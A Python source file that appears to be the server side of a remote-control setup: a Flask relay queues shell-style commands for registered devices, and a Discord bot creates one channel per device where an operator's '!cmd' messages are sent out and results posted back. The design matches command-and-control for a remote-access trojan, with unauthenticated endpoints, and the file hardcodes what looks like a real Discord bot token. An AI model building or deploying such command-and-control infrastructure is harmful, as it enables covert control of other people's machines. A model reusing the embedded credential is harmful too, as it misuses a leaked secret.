import threading
import queue
import time
import requests
from flask import Flask, request, jsonify

# --- Flask Relay Server ---
app = Flask(__name__)
device_queues = {}
device_results = {}
device_channels = {}  # device_id -> channel_id

@app.route('/poll', methods=['POST'])
def poll():
    device_id = request.json.get('device_id')
    if device_id not in device_queues:
        device_queues[device_id] = queue.Queue()
    try:
        command = device_queues[device_id].get_nowait()
    except queue.Empty:
        command = None
    return jsonify({'command': command})

@app.route('/result', methods=['POST'])
def result():
    device_id = request.json.get('device_id')
    result = request.json.get('result')
    device_results[device_id] = result
    print(f"Result from {device_id}: {result}")
    return jsonify({'status': 'ok'})

@app.route('/send_command', methods=['POST'])
def send_command():
    device_id = request.json.get('device_id')
    command = request.json.get('command')
    if device_id not in device_queues:
        device_queues[device_id] = queue.Queue()
    device_queues[device_id].put(command)
    return jsonify({'status': 'queued'})

@app.route('/get_result', methods=['GET'])
def get_result():
    device_id = request.args.get('device_id')
    result = device_results.get(device_id)
    return jsonify({'result': result})

@app.route('/register', methods=['POST'])
def register():
    device_id = request.json.get('device_id')
    device_channels[device_id] = None  # Mark for channel creation
    print(f"Device registered: {device_id}")
    return jsonify({'status': 'registered'})

def run_flask():
    app.run(host='0.0.0.0', port=5000)

# --- Discord Bot ---
import discord
import asyncio

DISCORD_TOKEN = "MTM4MzEyMzgwNjc5NjY0ODU4OQ.GnAg4m.bAem84Kl6jC9nCUvwmX9ShT-7iVKUdKS3jnnAE"

CATEGORY_PREFIX = "Device-"

intents = discord.Intents.default()
intents.message_content = True

def get_device_result(device_id):
    try:
        resp = requests.get("http://localhost:5000/get_result", params={"device_id": device_id})
        return resp.json().get("result")
    except Exception as e:
        return f"Error fetching result: {e}"

async def create_category_and_channel(client, device_id):
    guild = client.guilds[0]
    category_name = f"{CATEGORY_PREFIX}{device_id}"
    category = discord.utils.get(guild.categories, name=category_name)
    if not category:
        category = await guild.create_category(category_name)
    channel = discord.utils.get(category.channels, name="session-control")
    if not channel:
        channel = await guild.create_text_channel("session-control", category=category)
    device_channels[device_id] = channel.id
    print(f"Created category and channel for {device_id}: {channel.id}")
    return channel.id

class MyClient(discord.Client):
    async def setup_hook(self):
        # Start the watcher task when the bot is ready
        self.bg_task = asyncio.create_task(self.device_channel_watcher())

    async def device_channel_watcher(self):
        await self.wait_until_ready()
        while not self.is_closed():
            guild = self.guilds[0]
            for device_id, channel_id in list(device_channels.items()):
                if channel_id is None:
                    await create_category_and_channel(self, device_id)
            await asyncio.sleep(5)  # Check every 5 seconds

    async def on_ready(self):
        print(f'Logged in as {self.user}')

    async def on_message(self, message):
        if message.author == self.user:
            return
        for device_id, channel_id in device_channels.items():
            if message.channel.id == channel_id:
                if message.content.startswith("!cmd "):
                    command = message.content[len("!cmd "):]
                    requests.post("http://localhost:5000/send_command", json={
                        "device_id": device_id,
                        "command": command
                    })
                    await message.channel.send(f"Command sent to `{device_id}`: `{command}`")
                    # Poll for result (wait up to 30 seconds)
                    for _ in range(30):
                        result = get_device_result(device_id)
                        if result:
                            await message.channel.send(f"Result from `{device_id}`:\n```{result[:1900]}```")
                            break
                        time.sleep(1)
                    else:
                        await message.channel.send(f"No result from `{device_id}` after 30 seconds.")
                break

if __name__ == '__main__':
    threading.Thread(target=run_flask).start()
    client = MyClient(intents=intents)
    client.run(DISCORD_TOKEN)